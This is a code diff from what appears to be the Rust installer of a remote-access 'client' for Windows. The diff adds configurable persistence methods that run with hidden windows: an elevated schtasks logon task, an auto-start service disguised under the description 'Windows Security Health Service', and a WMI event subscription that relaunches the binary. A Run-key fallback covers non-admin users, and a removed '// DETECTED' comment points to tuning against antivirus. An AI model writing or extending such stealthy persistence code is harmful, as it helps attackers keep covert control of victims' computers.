@@ -14,6 +14,7 @@ use std::{
 };
 
 use std::os::windows::process::CommandExt;
+use common;
 
 pub fn is_elevated() -> bool {
     unsafe {
@@ -60,9 +61,9 @@ fn get_special_folder(name: &str) -> Option<PathBuf> {
     folder.map(PathBuf::from)
 }
 
-pub fn install(folder: String, filename: String, hidden: bool) {
-    println!("Installing client to {}", folder);
-    let install_dir = match get_special_folder(folder.as_str()) {
+pub fn install(config: &common::ClientConfig) {
+    println!("Installing client to {}", config.install_folder);
+    let install_dir = match get_special_folder(config.install_folder.as_str()) {
         Some(path) => path,
         None => {
             eprintln!("Invalid install folder.");
@@ -70,7 +71,7 @@ pub fn install(folder: String, filename: String, hidden: bool) {
         }
     };
 
-    let install_path = install_dir.join(filename);
+    let install_path = install_dir.join(&config.file_name);
 
     let current_exe = std::env::current_exe().unwrap();
     if current_exe == install_path {
@@ -80,17 +81,58 @@ pub fn install(folder: String, filename: String, hidden: bool) {
     const HIDE: u32 = 0x08000000;
 
     // Set persistence
-    if is_elevated() { // DETECTED
-        // schtasks
-        let task_name = install_path.file_stem().unwrap().to_string_lossy();
-        let task_cmd = format!(
-            "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
-            task_name, install_path.display()
-        );
-        let _ = Command::new("cmd")
-            .creation_flags(HIDE)
-            .args(["/c", &task_cmd])
-            .output();
+    if is_elevated() {
+        if config.persistence_schtasks {
+            let task_name = install_path.file_stem().unwrap().to_string_lossy();
+            let task_cmd = format!(
+                "schtasks /create /f /sc onlogon /rl highest /tn \"{}\" /tr '\"{}\"'",
+                task_name, install_path.display()
+            );
+            let _ = Command::new("cmd")
+                .creation_flags(HIDE)
+                .args(["/c", &task_cmd])
+                .output();
+        }
+
+        if config.persistence_service {
+            let service_name = install_path.file_stem().unwrap().to_string_lossy();
+            let create_cmd = format!(
+                "sc create \"{}\" binPath= \"{}\" start= auto",
+                service_name, install_path.display()
+            );
+            let _ = Command::new("cmd")
+                .creation_flags(HIDE)
+                .args(["/c", &create_cmd])
+                .output();
+
+            let description_cmd = format!(
+                "sc description \"{}\" \"Windows Security Health Service\"",
+                service_name
+            );
+            let _ = Command::new("cmd")
+                .creation_flags(HIDE)
+                .args(["/c", &description_cmd])
+                .output();
+
+            let start_cmd = format!("sc start \"{}\"", service_name);
+            let _ = Command::new("cmd")
+                .creation_flags(HIDE)
+                .args(["/c", &start_cmd])
+                .output();
+        }
+
+        if config.persistence_wmi {
+            let name = install_path.file_stem().unwrap().to_string_lossy();
+            let script = format!(
+                r#"$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{ Name = '{0}'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }}; $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{ Name = '{0}'; CommandLineTemplate = '"{1}"' }}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter = $Filter; Consumer = $Consumer }};"#,
+                name, install_path.display()
+            );
+
+            let _ = Command::new("powershell")
+                .creation_flags(HIDE)
+                .args(["-WindowStyle", "Hidden", "-Command", &script])
+                .output();
+        }
     } else {
         // Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
         let value_name = install_path.file_stem().unwrap().to_string_lossy();
